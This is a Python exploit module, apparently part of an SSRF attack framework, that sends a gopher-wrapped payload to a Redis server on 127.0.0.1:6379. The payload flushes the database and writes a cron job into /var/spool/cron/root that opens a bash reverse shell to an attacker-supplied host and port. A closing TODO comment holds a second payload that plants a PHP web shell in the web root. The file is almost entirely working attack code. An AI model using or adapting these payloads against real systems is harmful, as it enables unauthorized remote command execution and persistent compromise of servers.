from core.utils import *
import logging

name        = "redis"
description = "Redis RCE - Crontab reverse shell"
author      = "Swissky"

class exploit():

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Data for the service
        ip   = "127.0.0.1"
        port = "6379"
        data = "*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/SERVER_HOST/SERVER_PORT%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a"
        
        payload = wrapper_gopher(data, ip , port)

        # Handle args for reverse shell
        if args.lhost == None: payload = payload.replace("SERVER_HOST", input("Server Host:"))
        else:                  payload = payload.replace("SERVER_HOST", args.lhost)

        if args.lport == None: payload = payload.replace("SERVER_PORT", input("Server Port:"))
        else:                  payload = payload.replace("SERVER_PORT", args.lport)

        # Send the payload
        r = requester.do_request(args.param, payload)

"""
TODO:
command exec via php file
gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT
"""